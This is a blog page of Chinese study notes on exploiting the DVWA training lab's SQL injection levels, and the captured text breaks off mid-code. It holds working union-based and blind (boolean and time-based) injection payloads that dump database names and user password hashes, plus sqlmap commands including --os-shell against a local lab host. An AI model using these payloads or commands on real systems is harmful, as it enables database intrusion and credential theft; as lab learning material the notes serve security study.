<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="dvwa, Hyy&#39;s Blog">
    <meta name="description" content="SQL Injection12345678910111213141516171819202122$result = mysql_query($getid) or die(&amp;#x27;&amp;lt;pre&amp;gt;&amp;#x27;.mysql_error">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>dvwa | Hyy&#39;s Blog</title>
    <link rel="icon" type="image/png" href="/favicon.png">
    


    <!-- bg-cover style     -->



<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
<link rel="stylesheet" type="text/css" href="/css/matery.css">
<link rel="stylesheet" type="text/css" href="/css/my.css">
<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">




    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
    <link rel="stylesheet" href="/css/post.css">




    
        <link rel="stylesheet" type="text/css" href="/css/reward.css">
    



    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>

<meta name="generator" content="Hexo 6.3.0"></head>


<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">Hyy&#39;s Blog</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言板</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
  <li>
    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">Hyy&#39;s Blog</div>
        <div class="logo-desc">
            
            还只是个玩偶的时候，我就很想上战场了。现在机会来了，我唯一的机会。
            
        </div>
    </div>

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言板
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/20.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">dvwa</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/web%E9%9D%B6%E5%9C%BA/">
                                <span class="chip bg-color">web靶场</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2023-07-06
                </div>
                

                

                

                

                
            </div>
        </div>
        <hr class="clearfix">

        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <h1 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">result</span> <span class="operator">=</span> mysql_query($getid) <span class="keyword">or</span> die(<span class="string">&#x27;&lt;pre&gt;&#x27;</span>.mysql_error().<span class="operator">&lt;</span><span class="string">&#x27;/pre&#x27;</span><span class="operator">&gt;</span>);</span><br><span class="line">die()函数输出一条信息，并推出当前脚本</span><br><span class="line">mysql_error()函数返回上一个Mysql操作产生得到文本错误信息</span><br><span class="line"><span class="keyword">or</span>之前语句执行不成功事才会执行后面的语句</span><br><span class="line"><span class="keyword">and</span>之前语句执行成功事，才会执行后面的语句</span><br><span class="line"></span><br><span class="line">分为数字型和字符型</span><br><span class="line"><span class="keyword">select</span> first_name, last_name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> user_id<span class="operator">=</span>$id</span><br><span class="line"><span class="keyword">select</span> first_name, last_name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> user_id<span class="operator">=</span><span class="string">&#x27;$id&#x27;</span></span><br><span class="line">输入<span class="number">1</span><span class="operator">+</span><span class="number">2</span>看结果是<span class="number">1</span><span class="operator">+</span><span class="number">2</span>还是<span class="number">3</span></span><br><span class="line"></span><br><span class="line">对于字符型</span><br><span class="line"><span class="string">&#x27; or 1=1 or &#x27;</span>		假或真或假</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span>		真或真</span><br><span class="line"><span class="string">&#x27; or 1=1#			假或真</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="comment">--			假或真</span></span><br><span class="line"></span><br><span class="line">如何防御<span class="keyword">sql</span>注入</span><br><span class="line">首要原则：用户的一切输入都是有害的，不被信任</span><br><span class="line">防御的主要方法：对用户输入的数据进行过滤</span><br><span class="line"></span><br><span class="line">利用sqlmap进行需要登录的输入		cookie</span><br></pre></td></tr></table></figure>

<h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	mysql注释符 -- （后面有空格）或者#单行注释 本例多行注释</span></span><br><span class="line"><span class="comment">	php注释符	# //单行</span></span><br><span class="line"><span class="comment">	一定要用#？？</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--判断闭合点</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and 1=1						-- 单引号闭合</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> #					<span class="comment">-- 注释掉后面的部分	查用户1</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; or 1=1 #						-- 显示所有用户5个where恒成立</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span>#					<span class="comment">-- 三列报错说名只有2个字段,返回结果2个</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,2#			-- 回显，说明执行的sql语句为select Firstname,Surname from table where id= &#x27;</span>id<span class="string">&#x27;	应该是说返回值要有2个</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, database()#	<span class="comment">-- 获取当前数据库==》dvwa</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; union select version(), 2#	-- 获取版本</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="built_in">session_user</span>(), <span class="number">2</span>#	<span class="comment">-- 连接用户</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; union select @@version_compile_os,@@basedir# -- 操作系统 安装路径</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, schema_name <span class="keyword">from</span> information_schema.schemata#		<span class="comment">-- 查询有哪些数据库</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">查询dvwa有哪些表</span></span><br><span class="line"><span class="comment">有报错Illegal mix of collations for operation &#x27;UNION&#x27;</span></span><br><span class="line"><span class="comment">原因是两端类型不同https://blog.csdn.net/qq_43665434/article/details/114088565</span></span><br><span class="line"><span class="comment">需要修改类型</span></span><br><span class="line"><span class="comment">alter table users modify first_name varchar(15) character set utf8 collate utf8_general_ci</span></span><br><span class="line"><span class="comment">alter table users modify last_name varchar(15) character set utf8 collate utf8_general_ci</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; union select 2,table_name from information_schema.tables where table_schema=&#x27;</span>dvwa<span class="string">&#x27;#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> column_name,<span class="number">2</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>#			<span class="comment">-- 查字段	此处最好加上数据集名，可能存在多个数据库都有users的可能性</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> users modify <span class="keyword">user</span> <span class="type">varchar</span>(<span class="number">15</span>) <span class="type">character</span> <span class="keyword">set</span> utf8 <span class="keyword">collate</span> utf8_general_ci</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> users modify password <span class="type">varchar</span>(<span class="number">15</span>) <span class="type">character</span> <span class="keyword">set</span> utf8 <span class="keyword">collate</span> utf8_general_ci</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; union select user,password from dvwa.users#</span></span><br><span class="line"><span class="string">alter table users modify first_name varchar(15) character set utf8 collate utf8_unicode_ci</span></span><br><span class="line"><span class="string">alter table users modify last_name varchar(15) character set utf8 collate utf8_unicode_ci</span></span><br><span class="line"><span class="string">-- 这里要改成Unicode编码</span></span><br></pre></td></tr></table></figure>

<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>会检测输入不能有特殊符号，比如</p>
<p><img src="/2023/07/06/dvwa/1652614062263.png" alt="1652614062263"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">id=3 or 1=1						#查闭合点</span><br><span class="line">id=3 order by 3#					-- 三列报错说名只有2个字段,返回结果2个</span><br><span class="line">id=3 union select 1,2#			-- 回显，说明执行的sql语句为select Firstname,Surname from table where id= &#x27;id&#x27;	应该是说返回值要有2个</span><br><span class="line">id=3 union select 1, database()#	-- 获取当前数据库==》dvwa</span><br><span class="line">id=3 union select version(), 2#	-- 获取版本</span><br><span class="line">id=3 union select session_user(), 2#	-- 连接用户</span><br><span class="line">id=3 union select @@version_compile_os,@@basedir# -- 操作系统 安装路径</span><br><span class="line"></span><br><span class="line">-- 查询有哪些数据库		Illegal mix of collations for operation &#x27;UNION&#x27;</span><br><span class="line">id=3 union select 1, schema_name from information_schema.schemata#</span><br><span class="line"></span><br><span class="line">-- 查dvwa库有哪些表			这是单引号的问题</span><br><span class="line">id=5 union select 2,table_name from information_schema.tables where table_schema=&quot;dvwa&quot;#</span><br><span class="line">-- 查dvwa库有哪些表	Illegal mix of collations for operation &#x27;UNION&#x27;</span><br><span class="line">id=5 union select 2,table_name from information_schema.tables where table_schema=database()#</span><br><span class="line">-- 此处将first_name,last_name改回utf8_general_ci可以查询</span><br><span class="line"></span><br><span class="line">-- 查users表有哪些字段				这个不对不能有引号</span><br><span class="line">id=5 union select column_name,2 from information_schema.columns where table_name=&#x27;users&#x27;#</span><br><span class="line">-- 查users表有哪些字段		小葵花转换工具转成hex		Illegal mix of collations for operation &#x27;UNION&#x27;</span><br><span class="line">id=5 union select column_name,2 from information_schema.columns where table_name=0x7573657273#</span><br><span class="line">-- 此处将first_name,last_name改回utf8_general_ci可以查询</span><br><span class="line"></span><br><span class="line"># 查密码		此处需要将first_name,last_name改回utf8_unicode_ci</span><br><span class="line">id=5 union select user,password from dvwa.users#</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">弹框同Low级别输入</span><br></pre></td></tr></table></figure>

<h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><p>看源码只能输入数字，不可能产生注入</p>
<h1 id="SQLmap工具注入"><a href="#SQLmap工具注入" class="headerlink" title="SQLmap工具注入"></a>SQLmap工具注入</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">bp抓包抓不了127.0.0.1抓192.168.88.1这个是host-only分配的地址</span><br><span class="line">可以获取cookie也可以f12控制台document.cookie</span><br><span class="line"></span><br><span class="line">#	get请求注入</span><br><span class="line">#	-u后面双引号网址网址 --cookie=&quot;提交参数的网址（get请求）&quot;</span><br><span class="line">sqlmap.py -u &quot;http://192.168.88.1/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;PHPSESSID=qboo64r71thl7fa5c0qk73cph5; security=low&quot;</span><br><span class="line">#	得到数据库类型和版本	服务器系统类型	php版本 apache版本</span><br><span class="line"></span><br><span class="line">#	加--dbs得到所有数据库的名字</span><br><span class="line"></span><br><span class="line">#	post请求注入</span><br><span class="line">#	方法1		加上--forms</span><br><span class="line">sqlmap.py -u &quot;http://192.168.88.1/login.html&quot; --forms</span><br><span class="line">#	方法2		-r参数拦截加载的数据包信息放进sqlmap所在目录.txt文件 </span><br><span class="line">sqlmap.py -r &quot;search-test.txt&quot; -p &quot;username&quot;	#-p	重点检测username参数是否可注入</span><br><span class="line">#	方法3		利用os-shell参数获取shell</span><br><span class="line">1.网站必须是MSSQL或MySQL不可用于ACCSEE</span><br><span class="line">2.当前用户必须具有数据库管理员操作权限</span><br><span class="line">3.需要知道具体的文件路径</span><br><span class="line">#这里只有low级别可以实现</span><br><span class="line">首先检测出是不是注入点，然后加上--os-shell</span><br><span class="line">选择4（PHP）</span><br><span class="line">然后输入主目录路径D:\phpStudy\WWW\dvwa</span><br><span class="line">获取os-shell</span><br><span class="line">这个方法条件苛刻</span><br></pre></td></tr></table></figure>

<h1 id="搭建PHP加SQL-Server的Web环境"><a href="#搭建PHP加SQL-Server的Web环境" class="headerlink" title="搭建PHP加SQL Server的Web环境"></a>搭建PHP加SQL Server的Web环境</h1><p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Di4y1u7s6?p=7&vd_source=d5448e640adeda715972607248810967">https://www.bilibili.com/video/BV1Di4y1u7s6?p=7&amp;vd_source=d5448e640adeda715972607248810967</a></p>
<h2 id="SQL-Server的注入特性"><a href="#SQL-Server的注入特性" class="headerlink" title="SQL Server的注入特性"></a>SQL Server的注入特性</h2><p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Di4y1u7s6?p=8&vd_source=d5448e640adeda715972607248810967">https://www.bilibili.com/video/BV1Di4y1u7s6?p=8&amp;vd_source=d5448e640adeda715972607248810967</a></p>
<h1 id="SQL-Injection-Blind"><a href="#SQL-Injection-Blind" class="headerlink" title="SQL Injection(Blind)"></a>SQL Injection(Blind)</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">函数前加@符号，可以抑制报错信息</span><br></pre></td></tr></table></figure>

<h2 id="Low-1"><a href="#Low-1" class="headerlink" title="Low"></a>Low</h2><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">limit从<span class="number">0</span>开始</span><br><span class="line">substr从<span class="number">1</span>开始</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="operator">/</span><span class="operator">/</span>blog.csdn.net<span class="operator">/</span>qq_39670065<span class="operator">/</span>article<span class="operator">/</span>details<span class="operator">/</span><span class="number">107875210</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span>布尔盲注利用前提</span><br><span class="line">页面没有显示位，没有输出<span class="keyword">SQL</span>语句执行错误信息，只能通过页面返回正常不正常来判断是否存在注入。</span><br><span class="line"><span class="number">2.</span>布尔盲注利用    </span><br><span class="line">该语句判断数据库个数，当数据库个数大于n页面显示正常</span><br><span class="line">(<span class="keyword">select</span> <span class="built_in">count</span>(schema_name) <span class="keyword">from</span> information_schema.schemata)<span class="operator">&gt;</span> n</span><br><span class="line"></span><br><span class="line">该语句判断数据库内第一个数据库名有多少字符，字符个数大于n页面显示正常</span><br><span class="line">(<span class="keyword">select</span> length(schema_name) <span class="keyword">from</span> information_schema.schemata limit <span class="number">0</span>,<span class="number">1</span>)<span class="operator">&gt;</span> n</span><br><span class="line"></span><br><span class="line">该语句判断第一个库第一个字符是什么，ascii值大于n页面显示正常</span><br><span class="line">(<span class="keyword">select</span> ascii(substr((<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)))<span class="operator">&gt;</span>n</span><br><span class="line"></span><br><span class="line">相关函数学习</span><br><span class="line">Length() 返回字符串的长度</span><br><span class="line">substr() 截取字符串，偏移是从<span class="number">1</span>开始，而不是<span class="number">0</span>开始</span><br><span class="line">ascii() 返回字符的ascii码</span><br><span class="line"><span class="built_in">count</span>(column_name) 返回指定列的值的数目(<span class="keyword">NULL</span> 不计入)</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span>时间盲注利用前提</span><br><span class="line">页面上没有显示位，也没有输出<span class="keyword">SQL</span>语句执行错误信息。 正确的<span class="keyword">SQL</span>语句和错误的<span class="keyword">SQL</span>语句返回页面都一样，但是加入sleep(<span class="number">5</span>)条件之后，页面的返回速度明显慢了<span class="number">5</span>秒。</span><br><span class="line"><span class="number">2.</span>时间盲注利用</span><br><span class="line">该语句判断数据库个数，当数据库个数等于n页面返回延迟<span class="number">5</span>秒</span><br><span class="line">if((<span class="keyword">select</span> <span class="built_in">count</span>(schema_name) <span class="keyword">from</span> information_schema.schemata)<span class="operator">=</span>n,sleep(<span class="number">5</span>),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">该语句判断数据库内第一个数据库名有多少字符，字符个数等于n页面返回延迟<span class="number">5</span>秒</span><br><span class="line">if((<span class="keyword">select</span> length(schema_name) <span class="keyword">from</span> information_schema.schemata limit <span class="number">0</span>,<span class="number">1</span>)<span class="operator">=</span>n,sleep(<span class="number">5</span>),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">该语句判断第一个库第一个字符是什么，ascii值等于n页面返回延迟<span class="number">5</span>秒</span><br><span class="line">if((<span class="keyword">select</span> ascii(substr((<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)))<span class="operator">=</span>n,sleep(<span class="number">5</span>),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">相关函数学习</span><br><span class="line">Length（）函数 返回字符串的长度</span><br><span class="line">substr（）截取字符串</span><br><span class="line">ascii（）返回字符的ascii码</span><br><span class="line">sleep(n)：将程序挂起一段时间 n为n秒</span><br><span class="line">if(expr1,expr2,expr3):判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句</span><br><span class="line"><span class="built_in">count</span>(column_name)函数返回指定列的值的数目(<span class="keyword">NULL</span> 不计入)</span><br></pre></td></tr></table></figure>



<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 以下输入均显示存在		User ID exists in the database.</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and 1=1#</span></span><br><span class="line"><span 